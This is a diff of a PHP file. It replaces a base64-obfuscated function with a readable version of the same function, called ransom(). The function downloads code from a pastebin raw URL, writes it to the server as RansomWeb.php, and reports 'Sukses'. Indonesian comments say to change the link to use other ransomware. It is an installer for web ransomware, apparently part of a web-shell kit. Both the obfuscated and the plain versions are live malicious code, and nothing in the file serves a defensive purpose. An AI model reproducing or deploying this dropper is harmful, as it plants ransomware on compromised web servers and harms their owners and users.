@@ -1,1 +1,21 @@
-<?php function r_f526f20(){$f_f47645ae=base64_decode('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0xiVmhOblpG');$p_3e01b4d=curl_init($f_f47645ae);curl_setopt($p_3e01b4d,CURLOPT_RETURNTRANSFER,1);$g_fd3b2e70=curl_exec($p_3e01b4d);if($g_fd3b2e70!=''){$y_9a1e494f=fopen(base64_decode('UmFuc29tV2ViLnBocA=='),base64_decode('dw=='));fwrite($y_9a1e494f,$g_fd3b2e70);fclose($y_9a1e494f);$x_50b8ae71=base64_decode('UmFuc29tV2ViLnBocA==');$k_2b00320b=base64_decode('aHR0cDovLw==').$_SERVER[base64_decode('SFRUUF9IT1NU')].base64_decode('Lw==');if($y_9a1e494f!=''){echo base64_decode('PHNjcmlwdD53aW5kb3cubG9jYXRpb249Jz9wYXRoPQ==').$g_b548b0f.base64_decode('JzsgYWxlcnQoJ1N1a3NlcycpPC9zY3JpcHQ+');}else{echo base64_decode('R2FnYWwgTWVtYnVhdCBGaWxl');}}}?>
+function ransom(){
+            // Ubah Link ransomnya jika ingin ganti ransomware yangvlain
+            $url  = "https://pastebin.com/raw/LbVhNnZF";
+            $curl = curl_init($url);
+            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+            $get    = curl_exec($curl);
+
+            if ($get != "") { 
+                // Buat file
+                $puts = fopen("RansomWeb.php", "w");
+                fwrite($puts, $get);
+                fclose($puts);
+                $nama_file  = "RansomWeb.php";
+                $server_web = 'http://' . $_SERVER["HTTP_HOST"] . '/';
+                if ($puts != "") {
+                    echo "<script>window.location='?path=" . $path . "'; alert('Sukses')</script>";
+                } else {
+                    echo "Gagal Membuat File";
+                }
+            }
+}
